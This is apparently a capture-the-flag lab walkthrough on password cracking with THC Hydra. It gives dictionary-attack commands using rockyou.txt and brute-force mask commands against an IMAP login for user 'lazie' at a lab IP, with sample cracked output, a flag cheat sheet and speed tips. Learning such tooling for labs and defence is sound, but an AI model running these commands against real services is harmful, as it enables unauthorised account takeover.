# Password Cracking with THC Hydra – Walkthrough

---

## What is Hydra?
Hydra is an automated login cracker that supports many protocols (FTP, SSH, IMAP, POP3, HTTP, etc.). It takes a username and a wordlist, then tries every password until it finds the right one.

---

## Method 1 – Dictionary Attack (Wordlist)

This uses a pre-built list of common/leaked passwords.

### Step 1 – Identify your target info
You need three things:
- **Username** → e.g., `lazie`
- **Target IP** → e.g., `10.49.158.113`
- **Service** → e.g., `imap`, `ftp`, `ssh`

### Step 2 – Choose your wordlist
The most common wordlist available on Kali/AttackBox:
```
/usr/share/wordlists/rockyou.txt
```

### Step 3 – Run Hydra
```bash
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.49.158.113 imap
```

### Step 4 – Watch for the result
Hydra will print the cracked password like this:
```
[143][imap] host: 10.49.158.113   login: lazie   password: sunshine
```
Press **CTRL-C** once found.

### Step 5 – Add verbosity (optional but recommended)
```bash
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.49.158.113 imap -vV
```
This shows every attempt live so you can track progress.

---

## Method 2 – Brute Force Attack

Instead of a wordlist, brute force tries **every possible combination** of characters. Hydra supports this using character set masks.

### Step 1 – Install or confirm Hydra is available
```bash
hydra -h
```

### Step 2 – Use the brute force mode with `-x`
The `-x` flag lets you define the password pattern:
```
-x MIN:MAX:CHARSET
```
| Value | Meaning |
|-------|---------|
| `MIN` | Minimum password length |
| `MAX` | Maximum password length |
| `CHARSET` | `a` = lowercase, `A` = uppercase, `1` = numbers, `!` = symbols |

### Step 3 – Example commands

**Numbers only (4–6 digits):**
```bash
hydra -l lazie -x 4:6:1 10.49.158.113 imap
```

**Lowercase letters only (4–6 chars):**
```bash
hydra -l lazie -x 4:6:a 10.49.158.113 imap
```

**Lowercase + numbers (4–6 chars):**
```bash
hydra -l lazie -x 4:6:a1 10.49.158.113 imap
```

**All character types (4–6 chars):**
```bash
hydra -l lazie -x 4:6:aA1! 10.49.158.113 imap
```

### Step 4 – Speed it up with threads
```bash
hydra -l lazie -x 4:6:a1 -t 16 10.49.158.113 imap
```
`-t 16` runs 16 parallel connections — significantly faster.

---

## Key Flags Cheat Sheet

| Flag | Purpose |
|------|---------|
| `-l` | Single username |
| `-L` | File with multiple usernames |
| `-p` | Single password |
| `-P` | Wordlist file |
| `-x MIN:MAX:SET` | Brute force character range |
| `-t n` | Number of threads |
| `-vV` | Verbose – show all attempts |
| `-d` | Debug mode |
| `-s PORT` | Custom port |

---

## Dictionary vs Brute Force – When to Use What

| | Dictionary Attack | Brute Force |
|---|---|---|
| **Speed** | Fast | Slow |
| **Coverage** | Limited to wordlist | Tries everything |
| **Best for** | Common/weak passwords | When wordlist fails |
| **Wordlist needed** | Yes | No |

---

## Pro Tips
- Always start with a **dictionary attack** — it's faster
- Fall back to **brute force** only if dictionary fails
- Keep brute force length **short (4–6 chars)** to stay practical
- Use `-d` if Hydra seems frozen — it reveals connection issues
- Match your wordlist to the target (language, context, etc.)